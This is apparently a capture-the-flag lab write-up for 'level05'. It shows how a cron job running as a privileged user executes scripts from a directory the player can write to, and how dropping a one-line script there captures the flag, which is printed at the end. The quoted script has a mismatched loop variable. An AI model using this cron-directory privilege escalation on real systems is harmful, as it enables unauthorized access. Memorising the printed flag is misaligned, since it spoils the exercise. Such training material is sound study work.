# level05

- We log as `level05`

- As we log we can se a notification: `You have new mail.`

- We go into `/var/mail` and we find a `level05` file which contains:
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- This is a cron job that runs the command `su -c "sh /usr/sbin/openarenaserver"` every 2 minues

- Let's take a look at `/usr/sbin/openarenaserver`

- It is a simple sh script:
```
#!/bin/sh

for we in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
done
```

- We can see that this script execute every script present inside `/opt/openarenaserver` directory with `bash -x` and removes it after.

- We can check `/opt/openarenaserver` permissions using  `ls -la /opt/openarenaserver`
>`drwxrwxr-x+ 2 root root 40 Aug 17 23:50 .`

- It has extended permissions:
```
# file: .
# owner: root
# group: root
user::rwx
user:level05:rwx
user:flag05:rwx
group::r-x
mask::rwx
other::r-x
default:user::rwx
default:user:level05:rwx
default:user:flag05:rwx
default:group::r-x
default:mask::rwx
default:other::r-x
```

- We can see `level05` user (us) has all permissions on this directory so let's create a simple shell script named `pwn` inside `/opt/openarenaserver` :
>`echo "getflag > /tmp/pwned.txt" > /opt/openarenaserver/pwn`

- After 2 minutes the `/opt/openarenaserver/pwn` file dissapeared and a `/tmp/pwned.txt` file appeared

- Inside we get the flag: `viuaaale9huek52boumoomioc`